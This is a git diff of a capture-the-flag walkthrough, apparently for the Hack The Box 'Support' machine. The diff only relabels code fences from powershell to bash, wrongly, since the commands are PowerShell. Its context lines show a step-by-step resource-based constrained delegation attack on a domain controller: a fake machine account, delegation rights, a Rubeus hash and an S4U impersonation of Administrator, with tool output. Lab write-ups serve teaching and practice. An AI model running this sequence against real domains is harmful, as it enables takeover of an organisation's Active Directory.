@@ -309,13 +309,13 @@ For further information on Powermad.ps1 visit [https://offsec.tools/tool/powerma
 Now we just follow the instructions found with bloodhound to execute the exploit and take over the DC.
 
 * Step 1 (add-machine)
-```powershell
+```bash
 New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 [+] Machine account FAKE-COMP01 added
 
 ```
 * Step 2 (check if the machine has been created)
-```powershell
+```bash
 Get-ADComputer -identity FAKE-COMP01
 
 DistinguishedName : CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb
@@ -330,12 +330,12 @@ UserPrincipalName :
 ```
 
 * Step 3 (grant the DC permission to delegate the fake machine)
-```powershell
+```bash
 Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
 ```
 
 * Step 4 (confirm step 3 worked)
-```powershell
+```bash
 Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
 
 
@@ -351,7 +351,7 @@ SID                                  : S-1-5-21-1677581083-3380853377-188903654-
 UserPrincipalName                    :
 ```
 * Step 5 (generate an NTLM hash given a password for the fake machine)
-```powershell
+```bash
 .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
 
    ______        _
@@ -376,7 +376,7 @@ UserPrincipalName                    :
 [*]       des_cbc_md5          : 5B045E854358687C
 ```
 * Step 6 S4U(Service For User) attack to impersonate the Administrato user using the fake machine account
-```powershell
+```bash
 ../Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
 
    ______        _
